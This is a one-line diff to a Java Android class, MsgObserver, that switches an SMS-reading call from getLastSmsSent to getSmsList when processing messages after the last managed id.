@@ -105,7 +105,7 @@ public class MsgObserver extends ContentObserver implements Runnable {
 
 		if (smsEnabled) {
 			final SmsBrowser smsBrowser = new SmsBrowser();
-			final ArrayList<Sms> listSms = smsBrowser.getLastSmsSent(moduleMessage.getLastManagedSmsId());
+			final ArrayList<Sms> listSms = smsBrowser.getSmsList(moduleMessage.getLastManagedSmsId());
 			final Iterator<Sms> iterSms = listSms.listIterator();
 
 			while (iterSms.hasNext()) {
